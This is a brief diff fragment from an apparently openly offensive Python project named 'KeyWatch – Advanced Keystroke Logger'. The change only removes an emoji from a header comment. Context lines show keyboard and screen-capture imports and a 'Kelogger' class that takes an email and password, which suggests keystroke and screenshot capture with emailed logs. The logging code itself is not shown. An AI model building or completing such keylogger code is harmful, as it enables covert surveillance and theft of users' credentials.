@@ -11,7 +11,7 @@ from datetime import datetime
 from pynput.keyboard import Key
 import mss
 
-### 🛠️ Project: KeyWatch – Advanced Keystroke Logger
+###  Project: KeyWatch – Advanced Keystroke Logger
 
 class Kelogger:
   def __init__(self, time_interval, email, password, LOG_FILE_PATH):
